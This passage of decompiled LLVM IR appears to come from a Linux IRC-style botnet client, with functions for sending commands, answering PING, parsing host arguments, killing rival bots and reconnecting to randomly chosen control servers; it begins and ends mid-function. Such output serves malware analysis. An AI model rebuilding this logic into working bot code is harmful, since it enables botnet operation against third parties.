dec_label_pc_8048fe9:                             ; preds = %dec_label_pc_8048fc4
  %v4_8048fe9 = add i32 %stack_var_-20.1, 1
  %v7_8048ff0 = icmp sgt i32 %v4_8048fe9, 10
  %.v4_8048fe9 = select i1 %v7_8048ff0, i32 10, i32 %v4_8048fe9
  %v0_8049006 = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_8048fe9, 4
  %v3_8049006 = add i32 %tmp, -72
  %v4_8049006 = add i32 %v3_8049006, %v0_8049006
  %v5_8049006 = inttoptr i32 %v4_8049006 to i32*
  store i32 ptrtoint (i32* @global_var_80513de.269 to i32), i32* %v5_8049006, align 4
  %v2_80490b397 = load i8, i8* %stack_var_-24.0.lcssa, align 1
  %v4_80490b699 = icmp eq i8 %v2_80490b397, 0
  %v1_80490b8101 = icmp eq i1 %v4_80490b699, false
  br i1 %v1_80490b8101, label %dec_label_pc_804901a, label %dec_label_pc_80490be

dec_label_pc_804901a:                             ; preds = %dec_label_pc_8048fe9, %dec_label_pc_8049067
  %v4_80490b0103.in = phi i8* [ %v26_80490ad.pre-phi, %dec_label_pc_8049067 ], [ %stack_var_-24.0.lcssa, %dec_label_pc_8048fe9 ]
  %stack_var_-16.0102 = phi i32 [ %v4_80490a7, %dec_label_pc_8049067 ], [ 1, %dec_label_pc_8048fe9 ]
  %v4_80490b0103 = ptrtoint i8* %v4_80490b0103.in to i32
  %v5_804901a = add i32 %v4_80490b0103, 1
  %v22_804901a = inttoptr i32 %v5_804901a to i8*
  %v5_8049023 = icmp slt i32 %stack_var_-16.0102, %.v4_8048fe9
  br i1 %v5_8049023, label %dec_label_pc_8049035.preheader, label %dec_label_pc_80490be

dec_label_pc_8049035.preheader:                   ; preds = %dec_label_pc_804901a
  br label %dec_label_pc_8049035

dec_label_pc_8049032:                             ; preds = %dec_label_pc_804905a
  %v4_8049032 = add i32 %storemerge7, 1
  br label %dec_label_pc_8049035

dec_label_pc_8049035:                             ; preds = %dec_label_pc_8049035.preheader, %dec_label_pc_8049032
  %storemerge7 = phi i32 [ %v4_8049032, %dec_label_pc_8049032 ], [ 0, %dec_label_pc_8049035.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v5_804901a, i32* @edi, align 4
  %v3_804904f = call i32 @_strlen(i8* %v22_804901a)
  %v7_8049056 = icmp ult i32 %storemerge7, %v3_804904f
  %v1_8049058 = icmp eq i1 %v7_8049056, false
  %.pre40 = add i32 %storemerge7, %v5_804901a
  br i1 %v1_8049058, label %dec_label_pc_8049035.dec_label_pc_8049067_crit_edge, label %dec_label_pc_804905a

dec_label_pc_8049035.dec_label_pc_8049067_crit_edge: ; preds = %dec_label_pc_8049035
  %.pre47 = inttoptr i32 %.pre40 to i8*
  br label %dec_label_pc_8049067

dec_label_pc_804905a:                             ; preds = %dec_label_pc_8049035
  %v1_8049060 = inttoptr i32 %.pre40 to i8*
  %v2_8049060 = load i8, i8* %v1_8049060, align 1
  %v7_8049063 = icmp eq i8 %v2_8049060, 32
  %v1_8049065 = icmp eq i1 %v7_8049063, false
  br i1 %v1_8049065, label %dec_label_pc_8049032, label %dec_label_pc_8049067

dec_label_pc_8049067:                             ; preds = %dec_label_pc_804905a, %dec_label_pc_8049035.dec_label_pc_8049067_crit_edge
  %v26_80490ad.pre-phi = phi i8* [ %.pre47, %dec_label_pc_8049035.dec_label_pc_8049067_crit_edge ], [ %v1_8049060, %dec_label_pc_804905a ]
  store i32 %stack_var_-16.0102, i32* @ebx, align 4
  %v1_804906d = add i32 %storemerge7, 1
  %v1_8049071 = call i32 @malloc(i32 %v1_804906d)
  %v1_8049076 = load i32, i32* @ebp, align 4
  %v2_8049076 = load i32, i32* @ebx, align 4
  %v3_8049076 = mul i32 %v2_8049076, 4
  %v4_8049076 = add i32 %v1_8049076, -76
  %v5_8049076 = add i32 %v4_8049076, %v3_8049076
  %v6_8049076 = inttoptr i32 %v5_8049076 to i32*
  store i32 %v1_8049071, i32* %v6_8049076, align 4
  %v0_8049080 = load i32, i32* @ebp, align 4
  %v2_8049080 = mul nuw nsw i32 %stack_var_-16.0102, 4
  %v3_8049080 = add nuw nsw i32 %v2_8049080, -76
  %v4_8049080 = add i32 %v0_8049080, %v3_8049080
  %v5_8049080 = inttoptr i32 %v4_8049080 to i32*
  %v6_8049080 = load i32, i32* %v5_8049080, align 4
  %v3_8049092 = inttoptr i32 %v6_8049080 to i8*
  %v4_8049092 = call i32 @strncpy(i8* %v3_8049092, i32 %v5_804901a, i32 %storemerge7)
  %v0_804909a = load i32, i32* @ebp, align 4
  %v4_804909a = add i32 %v0_804909a, %v3_8049080
  %v5_804909a = inttoptr i32 %v4_804909a to i32*
  %v6_804909a = load i32, i32* %v5_804909a, align 4
  %v2_80490a1 = add i32 %v6_804909a, %storemerge7
  %v1_80490a4 = inttoptr i32 %v2_80490a1 to i8*
  store i8 0, i8* %v1_80490a4, align 1
  %v4_80490a7 = add nuw nsw i32 %stack_var_-16.0102, 1
  %v2_80490b3 = load i8, i8* %v26_80490ad.pre-phi, align 1
  %v4_80490b6 = icmp eq i8 %v2_80490b3, 0
  %v1_80490b8 = icmp eq i1 %v4_80490b6, false
  br i1 %v1_80490b8, label %dec_label_pc_804901a, label %dec_label_pc_80490be

dec_label_pc_80490be:                             ; preds = %dec_label_pc_8049067, %dec_label_pc_804901a, %dec_label_pc_8048fe9
  %v4_804913a = load i32, i32* bitcast ([4 x i8]** @global_var_8053440.271 to i32*), align 8
  %v1_8049141 = icmp eq i32 %v4_804913a, 0
  %v1_8049143 = icmp eq i1 %v1_8049141, false
  br i1 %v1_8049143, label %dec_label_pc_80490c7, label %dec_label_pc_8049145

dec_label_pc_80490c7:                             ; preds = %dec_label_pc_80490be
  %v2_80490de = inttoptr i32 %v4_804913a to i8*
  %v3_80490de = call i32 @__GI_strcasecmp(i8* %v2_80490de, i32 %v2_8048eb6)
  %v4_80490ea = load i32, i32* @global_var_8053444.272, align 4
  call void @__pseudo_call(i32 %v4_80490ea)
  %v5_804913094 = icmp sgt i32 %.v4_8048fe9, 1
  br i1 %v5_804913094, label %dec_label_pc_8049118, label %dec_label_pc_8049145

dec_label_pc_8049118:                             ; preds = %dec_label_pc_80490c7, %dec_label_pc_8049118
  %storemerge95 = phi i32 [ %v4_8049127, %dec_label_pc_8049118 ], [ 1, %dec_label_pc_80490c7 ]
  %v0_804911b = load i32, i32* @ebp, align 4
  %v2_804911b = mul nuw nsw i32 %storemerge95, 4
  %v3_804911b = add nuw nsw i32 %v2_804911b, -76
  %v4_804911b = add i32 %v3_804911b, %v0_804911b
  %v5_804911b = inttoptr i32 %v4_804911b to i32*
  %v6_804911b = load i32, i32* %v5_804911b, align 4
  %v1_8049122 = call i32 @free(i32 %v6_804911b)
  %v4_8049127 = add nuw nsw i32 %storemerge95, 1
  %v5_8049130 = icmp slt i32 %v4_8049127, %.v4_8048fe9
  br i1 %v5_8049130, label %dec_label_pc_8049118, label %dec_label_pc_8049145

dec_label_pc_8049145:                             ; preds = %dec_label_pc_80490c7, %dec_label_pc_8049118, %dec_label_pc_80490be, %dec_label_pc_8048f1d, %dec_label_pc_8048e9a, %dec_label_pc_8048e83
  %v0_804914e = phi i32 [ %v3_8048e8f, %dec_label_pc_8048e83 ], [ %v3_8048ea9, %dec_label_pc_8048e9a ], [ %v3_8048f35, %dec_label_pc_8048f1d ], [ %v4_804913a, %dec_label_pc_80490be ], [ %.v4_8048fe9, %dec_label_pc_8049118 ], [ 1, %dec_label_pc_80490c7 ]
  ret i32 %v0_804914e

; uselistorder directives
  uselistorder i32 %v4_8049127, { 1, 0 }
  uselistorder i32 %storemerge95, { 1, 0 }
  uselistorder i8* %v26_80490ad.pre-phi, { 1, 0 }
  uselistorder i32 %.pre40, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v5_804901a, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-16.0102, { 2, 1, 0, 3 }
  uselistorder i32 %.v4_8048fe9, { 1, 4, 2, 3, 0 }
  uselistorder i32 %v4_8048f9d, { 1, 0 }
  uselistorder i32 %v5_8048f9a, { 0, 2, 1 }
  uselistorder i8* %stack_var_-24.0111, { 0, 1, 4, 3, 2 }
  uselistorder i32 %.pre31, { 0, 2, 1 }
  uselistorder i32 %storemerge10, { 1, 0, 2 }
  uselistorder i32 %.pre23, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %.pre, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge12, { 1, 0, 2 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049145, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8049118, { 1, 0 }
  uselistorder label %dec_label_pc_8049035, { 1, 0 }
  uselistorder label %dec_label_pc_804901a, { 1, 0 }
  uselistorder label %dec_label_pc_8048fc4, { 1, 0 }
  uselistorder label %dec_label_pc_8048fc1, { 1, 0 }
  uselistorder label %dec_label_pc_8048fc4.preheader, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048f76, { 1, 0 }
  uselistorder label %dec_label_pc_8048eeb, { 1, 0 }
  uselistorder label %dec_label_pc_8048e51, { 1, 0 }
  uselistorder label %dec_label_pc_8048df8, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804914f = load i32, i32* @ebp, align 4
  store i32 %v0_804914f, i32* %stack_var_-4, align 4
  %v4_804914f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804914f, i32* @ebp, align 4
  %v0_8049155 = load i32, i32* @global_var_8055e10.268, align 16
  %v4_804916c = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_80513e0.273 to i32), i32 %v0_8049155)
  %v0_8049176 = load i32, i32* @global_var_8055e28.263, align 8
  %v4_8049192 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_80513ef.275 to i32), i32 %v0_8049176)
  %v0_8049197 = load i32, i32* @global_var_8055e10.268, align 16
  %v4_80491ae = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_80513fc.276 to i32), i32 %v0_8049197)
  ret i32 %v4_80491ae

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80491b5 = load i32, i32* @ebp, align 4
  store i32 %v0_80491b5, i32* %stack_var_-4, align 4
  %v4_80491b5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80491b5, i32* @ebp, align 4
  %v4_80491d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8051404.277 to i32), i32 %arg2)
  ret i32 %v4_80491d0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_80491fb.preheader

dec_label_pc_80491f5:                             ; preds = %dec_label_pc_804921a
  %v5_80491f5 = add i32 %.pre40, 1
  %v22_80491f5 = inttoptr i32 %v5_80491f5 to i8*
  %v4_80491f8 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80491fb

dec_label_pc_80491fb:                             ; preds = %dec_label_pc_80491fb.preheader, %dec_label_pc_80491f5
  %stack_var_-28.0 = phi i32 [ %v4_80491f8, %dec_label_pc_80491f5 ], [ %stack_var_-28.174, %dec_label_pc_80491fb.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_80491f5, %dec_label_pc_80491f5 ], [ %stack_var_-20.175, %dec_label_pc_80491fb.preheader ]
  %v3_804920f = call i32 @_strlen(i8* %arg1)
  %v7_8049216 = icmp ult i32 %stack_var_-28.0, %v3_804920f
  %v1_8049218 = icmp eq i1 %v7_8049216, false
  %.pre40 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_8049218, label %dec_label_pc_8049224, label %dec_label_pc_804921a

dec_label_pc_804921a:                             ; preds = %dec_label_pc_80491fb
  %v2_804921d = load i8, i8* %stack_var_-20.0, align 1
  %v7_8049220 = icmp eq i8 %v2_804921d, 32
  %v1_8049222 = icmp eq i1 %v7_8049220, false
  br i1 %v1_8049222, label %dec_label_pc_80491f5, label %dec_label_pc_8049224

dec_label_pc_8049224:                             ; preds = %dec_label_pc_80491fb, %dec_label_pc_804921a
  %v5_8049224 = add i32 %.pre40, 1
  %v3_804923b = call i32 @_strlen(i8* %arg1)
  %v4_804923b = mul i32 %v3_804923b, -1
  %v1_8049241 = sub i32 0, %v4_804923b
  %v2_8049242 = sub i32 0, %v4_804923b
  %v12_8049242 = icmp eq i32 %stack_var_-28.0, %v2_8049242
  br i1 %v12_8049242, label %dec_label_pc_80493fc, label %dec_label_pc_804924a

dec_label_pc_804924a:                             ; preds = %dec_label_pc_8049224
  %v22_8049224 = inttoptr i32 %v5_8049224 to i8*
  %v4_804924a = add nuw nsw i32 %storemerge1576, 1
  %v7_8049251 = icmp sgt i32 %storemerge1576, 3
  br i1 %v7_8049251, label %dec_label_pc_804925f.preheader, label %dec_label_pc_80491fb.preheader

dec_label_pc_80491fb.preheader:                   ; preds = %entry, %dec_label_pc_804924a
  %storemerge1576 = phi i32 [ 0, %entry ], [ %v4_804924a, %dec_label_pc_804924a ]
  %stack_var_-20.175 = phi i8* [ %arg1, %entry ], [ %v22_8049224, %dec_label_pc_804924a ]
  %stack_var_-28.174 = phi i32 [ 0, %entry ], [ %stack_var_-28.0, %dec_label_pc_804924a ]
  br label %dec_label_pc_80491fb

dec_label_pc_804925f.preheader:                   ; preds = %dec_label_pc_804924a
  br label %dec_label_pc_804925f

dec_label_pc_804925c:                             ; preds = %dec_label_pc_804927e
  %v4_804925c = add i32 %storemerge14, 1
  br label %dec_label_pc_804925f

dec_label_pc_804925f:                             ; preds = %dec_label_pc_804925f.preheader, %dec_label_pc_804925c
  %storemerge14 = phi i32 [ %v4_804925c, %dec_label_pc_804925c ], [ 0, %dec_label_pc_804925f.preheader ]
  %v3_8049273 = call i32 @_strlen(i8* %v22_8049224)
  %v7_804927a = icmp ult i32 %storemerge14, %v3_8049273
  %v1_804927c = icmp eq i1 %v7_804927a, false
  %.pre = add i32 %storemerge14, %v5_8049224
  br i1 %v1_804927c, label %dec_label_pc_804925f.dec_label_pc_804928b_crit_edge, label %dec_label_pc_804927e

dec_label_pc_804925f.dec_label_pc_804928b_crit_edge: ; preds = %dec_label_pc_804925f
  %.pre29 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804928b

dec_label_pc_804927e:                             ; preds = %dec_label_pc_804925f
  %v1_8049284 = inttoptr i32 %.pre to i8*
  %v2_8049284 = load i8, i8* %v1_8049284, align 1
  %v7_8049287 = icmp eq i8 %v2_8049284, 32
  %v1_8049289 = icmp eq i1 %v7_8049287, false
  br i1 %v1_8049289, label %dec_label_pc_804925c, label %dec_label_pc_804928b

dec_label_pc_804928b:                             ; preds = %dec_label_pc_804927e, %dec_label_pc_804925f.dec_label_pc_804928b_crit_edge
  %v1_8049291.pre-phi = phi i8* [ %.pre29, %dec_label_pc_804925f.dec_label_pc_804928b_crit_edge ], [ %v1_8049284, %dec_label_pc_804927e ]
  store i8 0, i8* %v1_8049291.pre-phi, align 1
  %v0_8049294 = load i32, i32* @global_var_8055e10.268, align 16
  %v4_80492a3 = call i32 @__GI_strcasecmp(i8* %v22_8049224, i32 %v0_8049294)
  %v1_80492a8 = icmp eq i32 %v4_80492a3, 0
  %v1_80492aa = icmp eq i1 %v1_80492a8, false
  br i1 %v1_80492aa, label %dec_label_pc_80493fc, label %dec_label_pc_80492b0

dec_label_pc_80492b0:                             ; preds = %dec_label_pc_804928b
  %v0_80492b0 = load i32, i32* @global_var_805378c.278, align 4
  %v1_80492b5 = icmp eq i32 %v0_80492b0, 0
  %v1_80492b7 = icmp eq i1 %v1_80492b5, false
  br i1 %v1_80492b7, label %dec_label_pc_80493fc, label %dec_label_pc_80492bd

dec_label_pc_80492bd:                             ; preds = %dec_label_pc_80492b0
  br label %dec_label_pc_80492d9.preheader

dec_label_pc_80492d3:                             ; preds = %dec_label_pc_80492f8
  %v5_80492d3 = add i32 %.pre39, 1
  %v22_80492d3 = inttoptr i32 %v5_80492d3 to i8*
  %v4_80492d6 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_80492d9

dec_label_pc_80492d9:                             ; preds = %dec_label_pc_80492d9.preheader, %dec_label_pc_80492d3
  %stack_var_-28.2 = phi i32 [ %v4_80492d6, %dec_label_pc_80492d3 ], [ %stack_var_-28.371, %dec_label_pc_80492d9.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_80492d3, %dec_label_pc_80492d3 ], [ %stack_var_-20.372, %dec_label_pc_80492d9.preheader ]
  %v3_80492ed = call i32 @_strlen(i8* %arg1)
  %v7_80492f4 = icmp ult i32 %stack_var_-28.2, %v3_80492ed
  %v1_80492f6 = icmp eq i1 %v7_80492f4, false
  %.pre39 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_80492f6, label %dec_label_pc_8049302, label %dec_label_pc_80492f8

dec_label_pc_80492f8:                             ; preds = %dec_label_pc_80492d9
  %v2_80492fb = load i8, i8* %stack_var_-20.2, align 1
  %v7_80492fe = icmp eq i8 %v2_80492fb, 32
  %v1_8049300 = icmp eq i1 %v7_80492fe, false
  br i1 %v1_8049300, label %dec_label_pc_80492d3, label %dec_label_pc_8049302

dec_label_pc_8049302:                             ; preds = %dec_label_pc_80492d9, %dec_label_pc_80492f8
  %v5_8049302 = add i32 %.pre39, 1
  %v3_8049319 = call i32 @_strlen(i8* %arg1)
  %v4_8049319 = mul i32 %v3_8049319, -1
  %v1_804931f = sub i32 0, %v4_8049319
  %v2_8049320 = sub i32 0, %v4_8049319
  %v12_8049320 = icmp eq i32 %stack_var_-28.2, %v2_8049320
  br i1 %v12_8049320, label %dec_label_pc_80493fc, label %dec_label_pc_8049328

dec_label_pc_8049328:                             ; preds = %dec_label_pc_8049302
  %v22_8049302 = inttoptr i32 %v5_8049302 to i8*
  %v4_8049328 = add nuw nsw i32 %storemerge1373, 1
  %v7_804932f = icmp sgt i32 %storemerge1373, 1
  br i1 %v7_804932f, label %dec_label_pc_804933d.preheader, label %dec_label_pc_80492d9.preheader

dec_label_pc_80492d9.preheader:                   ; preds = %dec_label_pc_80492bd, %dec_label_pc_8049328
  %storemerge1373 = phi i32 [ 0, %dec_label_pc_80492bd ], [ %v4_8049328, %dec_label_pc_8049328 ]
  %stack_var_-20.372 = phi i8* [ %arg1, %dec_label_pc_80492bd ], [ %v22_8049302, %dec_label_pc_8049328 ]
  %stack_var_-28.371 = phi i32 [ 0, %dec_label_pc_80492bd ], [ %stack_var_-28.2, %dec_label_pc_8049328 ]
  br label %dec_label_pc_80492d9

dec_label_pc_804933d.preheader:                   ; preds = %dec_label_pc_8049328
  br label %dec_label_pc_804933d

dec_label_pc_804933a:                             ; preds = %dec_label_pc_804935c
  %v4_804933a = add i32 %storemerge, 1
  br label %dec_label_pc_804933d

dec_label_pc_804933d:                             ; preds = %dec_label_pc_804933d.preheader, %dec_label_pc_804933a
  %storemerge = phi i32 [ %v4_804933a, %dec_label_pc_804933a ], [ 0, %dec_label_pc_804933d.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_8049302, i32* @edi, align 4
  %v3_8049351 = call i32 @_strlen(i8* %v22_8049302)
  %v0_8049358 = load i32, i32* @edx, align 4
  %v7_8049358 = icmp ult i32 %v0_8049358, %v3_8049351
  %v1_804935a = icmp eq i1 %v7_8049358, false
  %.pre30 = add i32 %storemerge, %v5_8049302
  br i1 %v1_804935a, label %dec_label_pc_804933d.dec_label_pc_8049369_crit_edge, label %dec_label_pc_804935c

dec_label_pc_804933d.dec_label_pc_8049369_crit_edge: ; preds = %dec_label_pc_804933d
  %.pre37 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_8049369

dec_label_pc_804935c:                             ; preds = %dec_label_pc_804933d
  %v1_8049362 = inttoptr i32 %.pre30 to i8*
  %v2_8049362 = load i8, i8* %v1_8049362, align 1
  %v7_8049365 = icmp eq i8 %v2_8049362, 32
  %v1_8049367 = icmp eq i1 %v7_8049365, false
  br i1 %v1_8049367, label %dec_label_pc_804933a, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_804935c, %dec_label_pc_804933d.dec_label_pc_8049369_crit_edge
  %v1_804936f.pre-phi = phi i8* [ %.pre37, %dec_label_pc_804933d.dec_label_pc_8049369_crit_edge ], [ %v1_8049362, %dec_label_pc_804935c ]
  store i8 0, i8* %v1_804936f.pre-phi, align 1
  %v2_8049378 = call i32 @inet_addr(i32 %v5_8049302)
  %v3_8049378 = trunc i32 %v2_8049378 to i8
  store i8 %v3_8049378, i8* %stack_var_-32, align 1
  %sext = mul i32 %v2_8049378, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8049386 = icmp eq i1 %tmp, false
  br i1 %v1_8049386, label %dec_label_pc_8049369._crit_edge, label %dec_label_pc_8049388

dec_label_pc_8049369._crit_edge:                  ; preds = %dec_label_pc_8049369
  br label %bb

dec_label_pc_8049388:                             ; preds = %dec_label_pc_8049369
  %v2_804938e = call i32 @__GI_gethostbyname(i32 %v5_8049302)
  %v4_8049396 = icmp eq i32 %v2_804938e, 0
  br i1 %v4_8049396, label %dec_label_pc_80493fc, label %dec_label_pc_804939c

dec_label_pc_804939c:                             ; preds = %dec_label_pc_8049388
  %v1_804939f = add i32 %v2_804938e, 12
  %v2_804939f = inttoptr i32 %v1_804939f to i32*
  %v3_804939f = load i32, i32* %v2_804939f, align 4
  %v1_80493a7 = add i32 %v2_804938e, 16
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493aa = inttoptr i32 %v3_80493a7 to i32*
  %v2_80493aa = load i32, i32* %v1_80493aa, align 4
  %v1_80493b1 = inttoptr i32 %v2_80493aa to i8*
  %v7_80493b4 = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_80493b1, i32 %v3_804939f)
  %v2_80493c1.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_8049369._crit_edge, %dec_label_pc_804939c
  %v2_80493c1 = phi i8 [ %v3_8049378, %dec_label_pc_8049369._crit_edge ], [ %v2_80493c1.pre, %dec_label_pc_804939c ]
  store i8 %v2_80493c1, i8* bitcast (i8** @global_var_805378b.280 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8053788.279 to i8*), align 4
  store i32 256, i32* @global_var_805378c.278, align 4
  br label %dec_label_pc_80493fc

dec_label_pc_80493fc:                             ; preds = %dec_label_pc_8049224, %dec_label_pc_8049302, %dec_label_pc_8049388, %dec_label_pc_80492b0, %dec_label_pc_804928b, %bb
  %v0_8049402 = phi i32 [ 0, %dec_label_pc_8049388 ], [ %v0_80492b0, %dec_label_pc_80492b0 ], [ %v4_80492a3, %dec_label_pc_804928b ], [ ptrtoint (i8** @global_var_8053788.279 to i32), %bb ], [ %v1_804931f, %dec_label_pc_8049302 ], [ %v1_8049241, %dec_label_pc_8049224 ]
  ret i32 %v0_8049402

; uselistorder directives
  uselistorder i32 %.pre30, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge1373, { 1, 0 }
  uselistorder i32 %v5_8049302, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 0, 2 }
  uselistorder i32 %storemerge1576, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_8053788.279, { 1, 0 }
  uselistorder i8* %arg1, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_80493fc, { 5, 2, 1, 3, 4, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804933d, { 1, 0 }
  uselistorder label %dec_label_pc_80492d9.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049302, { 1, 0 }
  uselistorder label %dec_label_pc_804925f, { 1, 0 }
  uselistorder label %dec_label_pc_80491fb.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049224, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049403 = load i32, i32* @ebp, align 4
  store i32 %v0_8049403, i32* %stack_var_-4, align 4
  %v4_8049403 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049403, i32* @ebp, align 4
  %v0_8049409 = load i32, i32* @global_var_8055e10.268, align 16
  %v1_8049411 = call i32 @free(i32 %v0_8049409)
  store i32 %v1_8049411, i32* @eax, align 4
  %v2_804941d = call i32 @makestring(i32 ptrtoint ([14 x i8]* @global_var_805140d.283 to i32))
  %v2_804942c = ptrtoint i32* %stack_var_-62 to i32
  store i32 %v2_804942c, i32* @eax, align 4
  %v3_8049432 = bitcast i32* %stack_var_-62 to i8*
  %v4_8049432 = call i32 @strcpy(i8* %v3_8049432, i32 ptrtoint ([14 x i8]* @global_var_805140d.283 to i32))
  %v4_8049444 = call i32 @strcat(i8* %v3_8049432, i32 %v2_804941d)
  store i32 %v2_804942c, i32* @global_var_8055e10.268, align 16
  %v0_8049451 = call i32 @botkiller()
  ret i32 %v0_8049451

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049458 = load i32, i32* @ebp, align 4
  store i32 %v0_8049458, i32* %stack_var_-4, align 4
  %v4_8049458 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049458, i32* @ebp, align 4
  %v2_804952e = ptrtoint i32* %stack_var_-32 to i32
  %v2_8049531 = ptrtoint i32* %stack_var_-28 to i32
  %v2_804957d = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_8049460.backedge, %entry
  store i32 -1, i32* @global_var_8055e14.284, align 4
  store i32 1, i32* %stack_var_-36, align 4
  %v0_8049471 = load i32, i32* @global_var_8053780.285, align 128
  store i32 %v0_8049471, i32* @eax, align 4
  %v1_8049476 = icmp eq i32 %v0_8049471, 0
  %v1_8049478 = icmp eq i1 %v1_8049476, false
  br i1 %v1_8049478, label %dec_label_pc_804949d, label %dec_label_pc_804947a

dec_label_pc_804947a:                             ; preds = %dec_label_pc_8049460
  %v1_804947a = call i32 @random()
  %v0_8049481 = load i64, i64* @global_var_8053418.286, align 8
  %sext = mul i64 %v0_8049481, 4294967296
  %v5_8049486 = sdiv i64 %sext, 4294967296
  %v1_804948b = ashr i32 %v1_804947a, 31
  %v6_804948c = zext i32 %v1_804947a to i64
  %v8_804948c = zext i32 %v1_804948b to i64
  %v9_804948c = mul nuw i64 %v8_804948c, 4294967296
  %v10_804948c = or i64 %v9_804948c, %v6_804948c
  %v14_804948c = srem i64 %v10_804948c, %v5_8049486
  %v15_804948c = trunc i64 %v14_804948c to i32
  %v1_8049491 = mul i32 %v15_804948c, 4
  %v2_8049491 = add i32 %v1_8049491, ptrtoint ([22 x i8]** @global_var_805341c.288 to i32)
  %v3_8049491 = inttoptr i32 %v2_8049491 to i32*
  %v4_8049491 = load i32, i32* %v3_8049491, align 4
  store i32 %v4_8049491, i32* @global_var_8055e1c.289, align 4
  br label %dec_label_pc_804949d

dec_label_pc_804949d:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_804947a
  store i32 0, i32* @global_var_8053780.285, align 128
  br label %dec_label_pc_80494a7

dec_label_pc_80494a7:                             ; preds = %dec_label_pc_80494a7, %dec_label_pc_804949d
  store i32 2, i32* %stack_var_-60, align 4
  %v3_80494be = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_80494be, i32* @global_var_8055e14.284, align 4
  %v2_80494cd = icmp slt i32 %v3_80494be, 0
  br i1 %v2_80494cd, label %dec_label_pc_80494a7, label %dec_label_pc_80494d1

dec_label_pc_80494d1:                             ; preds = %dec_label_pc_80494a7
  %v0_80494d1 = load i32, i32* @global_var_8055e1c.289, align 4
  store i32 %v0_80494d1, i32* %stack_var_-60, align 4
  %v1_80494d9 = call i32 @inet_addr(i32 %v0_80494d1)
  %v1_80494de = icmp eq i32 %v1_80494d9, 0
  br i1 %v1_80494de, label %dec_label_pc_80494f4, label %dec_label_pc_80494e2

dec_label_pc_80494e2:                             ; preds = %dec_label_pc_80494d1
  %v0_80494e2 = load i32, i32* @global_var_8055e1c.289, align 4
  store i32 %v0_80494e2, i32* %stack_var_-60, align 4
  %v1_80494ea = call i32 @inet_addr(i32 %v0_80494e2)
  %v10_80494ef = icmp eq i32 %v1_80494ea, -1
  %v1_80494f2 = icmp eq i1 %v10_80494ef, false
  br i1 %v1_80494f2, label %dec_label_pc_804954e, label %dec_label_pc_80494f4

dec_label_pc_80494f4:                             ; preds = %dec_label_pc_80494e2, %dec_label_pc_80494d1
